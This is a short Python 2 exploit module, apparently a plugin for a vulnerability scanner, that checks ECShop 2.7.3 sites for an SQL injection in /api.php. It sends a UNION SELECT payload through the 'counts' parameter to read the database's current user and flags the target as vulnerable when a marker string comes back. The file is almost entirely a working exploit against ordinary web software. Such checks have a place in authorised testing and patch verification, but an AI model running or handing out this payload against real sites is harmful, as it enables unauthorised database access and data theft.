#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Lcy
# @Date:   2016-09-20 15:34:41
# @Last Modified by:   Lcy
# @Last Modified time: 2016-09-26 16:42:54
import urllib2,urllib
class Exploit:
    def __init__(self,target,expfile):
        self.target = target
        self.result = {
            "name": "ecshop 2.7.3 /api.php SQL注入漏洞",
            "author": "Lcy",
            "type": "website",
            "ref": "http://phpinfo.me",
            "status":False,
            "info":"",
            'filename':expfile,
            "target":target,
        }
    def verify(self):
        verify_url = self.target + '/api.php'
        canshu = {'return_data':'json',
                'ac':'1',
                'act':'search_goods_list',
                'api_version':'1.0',
                'last_modify_st_time':'1',
                'last_modify_en_time':'1',
                'pages':'1',
                'counts':'1 UNION ALL SELECT NULL,CONCAT(0x666630303030,IFNULL(CAST(CURRENT_USER()AS CHAR),0x20),0x20)#'}
        data = urllib.urlencode(canshu)
        req = urllib2.urlopen(verify_url, data,timeout=5)
        content = req.read()
        if 'ff0000' in content:
            self.result['status'] = True
            self.result['info'] = "目标存在ecshop 2.7.3 /api.php SQL注入漏洞,验证url:%s" % verify_url